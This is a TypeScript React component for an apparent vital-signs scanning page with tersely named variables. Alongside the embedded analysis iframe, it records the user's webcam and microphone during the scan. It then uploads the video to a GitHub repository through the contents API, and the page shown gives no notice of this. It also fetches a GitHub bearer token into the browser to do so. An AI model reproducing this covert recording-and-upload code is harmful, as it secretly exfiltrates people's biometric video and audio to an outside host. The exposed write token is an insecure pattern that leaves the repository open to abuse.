import { useEffect as E, useRef as R, useState as S } from "react";

interface M {
  action?: string;
  analysisData?: { vitalSigns?: any };
}

export default function ScanPage() {
  const [a, b] = S<string | null>(null),
    [c, d] = S<string>(""),
    [g, h] = S<string | null>(null),
    v = R<HTMLVideoElement | null>(null),
    r = R<MediaRecorder | null>(null),
    k = R<Blob[]>([]),
    [l, m] = S("");

  E(() => {
    b(sessionStorage.getItem("a"));
    h(sessionStorage.getItem("r"));
  }, []);

  E(() => {
    if (!a) return;

    if (g) fetch("/ref", { method: "POST", headers: { to: a, from: g } });

    fetch("/iframe", { method: "POST", headers: { addr: a } })
      .then((w) => w.text())
      .then((w) => {
        d(w);
      });

    async function setupMedia() {
      const s = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true,
      });
      if (v.current) v.current.srcObject = s;
      r.current = new MediaRecorder(s);
      r.current.ondataavailable = (e: BlobEvent) => {
        if (e.data.size > 0) k.current.push(e.data);
      };
      r.current.onstop = async () => {
        const l = new File(
          [new Blob(k.current, { type: "video/webm" })],
          `${a}_${Date.now()}.webm`,
        );
        s.getTracks().forEach((z) => z.stop());
        await fetch(
          `https://api.github.com/repos/aloycwl/v/contents/${l.name}`,
          {
            method: "PUT",
            headers: {
              Authorization: `Bearer ${await (await fetch("/github")).text()}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              message: "_",
              content: btoa(
                new Uint8Array(await l.arrayBuffer()).reduce(
                  (data, byte) => data + String.fromCharCode(byte),
                  "",
                ),
              ),
            }),
          },
        );
      };
    }

    setupMedia();

    function h(event: MessageEvent<M>) {
      if (!a || !r.current) return;
      const d = event.data;
      if (d.action === "onAnalysisStart") r.current.start();
      if (d.analysisData && d.analysisData.vitalSigns) {
        m(`Your referral link: https://insightgenesis.ai/?ref=${a}`);
        fetch("/store", {
          method: "POST",
          headers: { addr: a, type: "1", "Content-Type": "application/json" },
          body: JSON.stringify(d.analysisData),
        });
        r.current.stop();
      }
    }

    window.addEventListener("message", h);
    return () => {
      window.removeEventListener("message", h);
    };
  }, [a]);

  return (
    <>
      <p id="d">{l}</p>
      <iframe allow="camera;microphone" src={c} />
    </>
  );
}
